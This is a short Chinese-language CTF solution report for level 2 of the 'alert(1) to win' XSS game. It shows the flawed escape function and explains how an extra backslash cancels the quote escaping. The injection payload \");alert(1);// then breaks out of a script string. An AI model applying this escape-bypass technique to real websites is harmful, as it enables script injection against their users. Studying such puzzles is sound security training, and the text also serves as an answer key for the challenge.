## [[alert(1) to win](https://alf.nu/alert1)] [[Level 02 - Adobe](https://alf.nu/alert1)] [[解题报告](https://exp-blog.com/safe/ctf/alert/level-02-adobe/)]

------

## 题目

```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

------

## 解题报告

由于所有 `"` 都被转义为 `\"` ，导致无法直接闭合函数。

但是不能直接闭合，不等于无法闭合。

因为只是转义了双引号 `"` ，没有转义反斜杠 `\` ，那么我们只需要再输入一个反斜杠去吃掉转义双引号的反斜杠，那么双引号就得以保留，并用来闭合函数了。

于是可以构造 payload 如下 （此处没有闭合后半段的双引号，而是通过行注释 `//` 屏蔽掉）：

```javascript
\");alert(1);//
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/alert/Level%2002%20-%20Adobe/imgs/01.png)


------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
